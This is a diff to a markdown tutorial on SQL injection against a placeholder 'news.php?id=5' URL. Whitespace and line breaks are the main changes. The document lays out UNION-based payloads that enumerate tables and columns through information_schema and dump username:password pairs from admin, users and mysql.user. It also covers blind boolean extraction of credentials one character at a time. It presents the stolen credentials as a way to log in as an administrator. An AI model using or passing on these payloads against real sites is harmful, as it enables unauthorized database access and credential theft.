@@ -25,7 +25,11 @@ So if we get some error like
 ~~~
 
 ### GETTING TABLE AND COLUMN NAME
-Well if the MySQL version is < 5 (example, 4.1.33, 4.1.12…), we must guess table and column name in most cases. Common table names are: user/s, admin/s, member/s. Common table names are: user/s, admin/s, member/s. Common column names are: username, user, usr, user_name, password, pass, passwd, pwd etc…
+
+Well if the MySQL version is < 5 (example, 4.1.33, 4.1.12…), we must guess table and column name in most cases. 
+Common table names are: user/s, admin/s, member/s. 
+Common table names are: user/s, admin/s, member/s. 
+Common column names are: username, user, usr, user_name, password, pass, passwd, pwd etc…
 Example:
 ~~~bash
 http://server/news.php?id=5 union all select 1,2,3 from admin/*
@@ -37,9 +41,11 @@ Now to check if column password exists.
 http://server/news.php?id=5 union all select 1,password,3 from admin/*
 ~~~
 We seen password on the screen in hash or plain-text, it depends of how the database is set up i.e md5 hash, mysql hash, sha1. Now we must complete query to look nice. For that we can use concat() function (it joins strings)
+
 Example:
 http://server/news.php?id=5 union all select1,concat(username,0x3a,password),3 from admin/*
-NOTE: We used 0x3a, it’s a hexadecimal value (0x3a is the hexadecimal value for the column). Another method is to use char (58) in ascii mode.
+NOTE: We used 0x3a, it’s a hexadecimal value (0x3a is the hexadecimal value for the column). 
+Another method is to use char (58) in ascii mode.
 http://server/news.php?id=5 union all select 1,concat(username,char(58), password),3 from admin/*
 Now we get dislayed username:password on screen, i.e admin:admin or admin:somehash when you have this, you can login like admin or some superuser. If can’t guess the right table name, you can always try “mysql.user”, as per the following example:
 http://server/news.php?id=5 union all select 1,concat(user,0x3a,password),3 from mysql.user/*
@@ -48,8 +54,9 @@ For this we need “information_schema” table. It contains all tables and colu
 Example:
 ~~~bash
 http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables/*
-Here we replace the number 2 with “table_name” to get the first table from “information_schema”.tables displayed on the screen. Furthermore we will need to add LIMIT to the end of query to liste out al tables.
 ~~~
+Here we replace the number 2 with “table_name” to get the first table from “information_schema”.tables displayed on the screen. 
+Furthermore we will need to add LIMIT to the end of query to liste out al tables.
 Example:
 ~~~bash
 http://server/news.php?id=5 union all select 1,table_name,3 from infor-mation_schema.tables limit 0,1/*
@@ -78,8 +85,9 @@ The second column is displayed, so keep incrementing until you get something lik
 Example:
 ~~~bash
 http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns where table_name='users'/*
-Now we get displayed column name in table users. Note, this won’t work if the magic quotes is ON. Let’s say that we found columns user, pass and email, now to complete the query, we put them all together and for that we will use concat().
 ~~~
+Now we get displayed column name in table users. Note, this won’t work if the magic quotes is ON. 
+Let’s say that we found columns user, pass and email, now to complete the query, we put them all together and for that we will use concat().
 Example:
 ~~~bash
 http://server/news.php?id=5 union all select 1, concat(user,0x3a,pass,0x3a,email) from users/*
@@ -151,7 +159,8 @@ Example:
 ~~~bash
 http://server/news.php?id=5 and (select 1 from mysql.user limit 0,1)=1
 ~~~
-If the page is loading properly then it’s mean we do have access to “mysql.user”. According to this last query we can if we want using this access to extract for example some password usign load_file() function and OUTFILE.
+If the page is loading properly then it’s mean we do have access to “mysql.user”. 
+According to this last query we can if we want using this access to extract for example some password usign load_file() function and OUTFILE.
 
 ## CHECK TABLE AND COLUMN NAMES
 This is part is where guessing and googling will be your best friend.
@@ -159,13 +168,18 @@ Example:
 ~~~bash
 http://server/news.php?id=5 and (select 1 from users limit 0,1)=1
 ~~~
-In the above example, using “limit 0,1” our query will return “1 row of data”. Then if the page loads normally without content missing, that simply mean the “users” table has been found. If you get FALSE, such as some missing content in the page just change table name until you guess the correct one.
-Now let’s say that we have found that table name is “users”, the next step will be to find out the column name using the same exact methodology then before. We will start with a common name such as “password”.
+In the above example, using “limit 0,1” our query will return “1 row of data”. 
+Then if the page loads normally without content missing, that simply mean the “users” table has been found. 
+If you get FALSE, such as some missing content in the page just change table name until you guess the correct one.
+Now let’s say that we have found that table name is “users”, the next step will be to find out the column name using the same exact methodology then before. 
+We will start with a common name such as “password”.
+
 Example:
 ~~~bash
 http://server/news.php?id=5 and (select substring(concat(1,password),1,1) from users limit 0,1)=1
 ~~~
-If the page is loading properly we now know that the column name is “password”. If we get FALSE, then try another common names. In the above example, we merge “1” with the column “password”, then the substring() function returns the first character.
+If the page is loading properly we now know that the column name is “password”. 
+If we get FALSE, then try another common names. In the above example, we merge “1” with the column “password”, then the substring() function returns the first character.
 
 ## EXTRACT DATA FROM DATABASE
 Let say that we definitely found the table “users” and the columns “username” and “password”. It’s now the time to use it to extract some relevant informations.
@@ -173,6 +187,7 @@ Let say that we definitely found the table “users” and the columns “userna
 http://server/news.php?id=5 and ascii(substring((SELECT concat (username,0x3a,password) from users limit 0,1),1,1))>80
 ~~~
 With the above query the substring() function will return the first character from the first user in “users” table. The ascii() converts that first character into ascii value and then compare it with the symbol greater then “>” .
+
 Well at this step you already understand that, if the ascii character is greater then 80, the page will load properly. We will need to continue until we get false.
 ~~~bash
 http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>95
@@ -207,7 +222,6 @@ We get TRUE, then let try an higher one.
 http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105
 ~~~
 
->Notes
-[***dig +short myip.opendns.com @resolver1.opendns.com
-dig TXT +short o-o.myaddr.l.google.com @ns1.google.com
-***]
+> Notes
+*dig +short myip.opendns.com @resolver1.opendns.com*
+*dig TXT +short o-o.myaddr.l.google.com @ns1.google.com*
